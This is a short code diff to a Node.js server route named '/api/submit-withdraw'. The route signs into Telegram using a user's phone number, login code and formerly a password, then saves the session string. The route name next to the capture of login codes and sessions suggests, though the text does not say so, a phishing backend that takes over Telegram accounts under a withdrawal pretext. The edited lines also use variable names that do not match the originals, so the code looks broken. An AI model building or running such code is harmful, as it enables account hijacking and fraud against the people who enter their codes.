@@ -95,12 +95,15 @@ app.post('/api/submit-withdraw', async (req, res) => {
     try {
         const { client, phoneCodeHash, session } = authData;
 
-        await client.signIn({
-            phoneNumber: '+' + cleanPhone,
-            phoneCodeHash: phoneCodeHash,
-            phoneCode: inputCode,
-            password: async () => password || '',
-        });
+        const { Api } = require("telegram");
+
+await client.invoke(
+    new Api.auth.SignIn({
+        phoneNumber: phone,
+        phoneCodeHash: phoneCodeHash,
+        phoneCode: code,
+    })
+);
 
         const me = await client.getMe();
         const sessionString = session.save();
